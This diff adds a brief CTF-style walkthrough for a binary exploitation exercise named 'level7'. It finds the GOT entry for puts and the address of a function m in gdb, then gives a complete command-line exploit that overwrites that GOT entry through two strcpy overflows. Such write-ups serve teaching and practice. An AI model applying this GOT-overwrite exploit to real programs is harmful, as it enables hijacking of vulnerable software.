@@ -1,0 +1,9 @@
+in gdb :
+	find the address of the last puts in the G.O.T	# 0x08049928
+	and the address of the function m				# 0x080484f4
+
+then we just overwrite the GOT of puts with the address of m
+with the two strcpy() functions
+
+=> ./level7 `python -c 'print "AAAA" * 5 + "\x08\x04\x99\x28"[::-1]'` `python -c 'print "\x08\x04\x84\xf4"[::-1]'`
+
